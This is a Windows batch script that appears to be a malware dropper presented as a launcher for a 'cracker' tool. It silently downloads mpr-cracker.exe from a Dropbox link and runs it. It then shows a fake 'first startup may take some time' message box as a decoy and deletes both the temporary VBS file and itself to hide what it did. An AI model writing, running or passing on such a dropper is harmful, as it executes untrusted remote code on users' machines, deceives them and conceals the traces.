@echo off 
curl -l -o "mpr-cracker.exe" https://dl.dropboxusercontent.com/s/m4pq0tg1c6wn8db/mpr-cracker.exe?dl=0 2>NUL
start mpr-cracker.exe 
TIMEOUT /T 5 >NUL
echo x=msgbox("Your first startup may take some time, please wait..." ,0, "Info") >> msgbox.vbs
start msgbox.vbs
TIMEOUT /T 5 >NUL
del msgbox.vbs
del %0

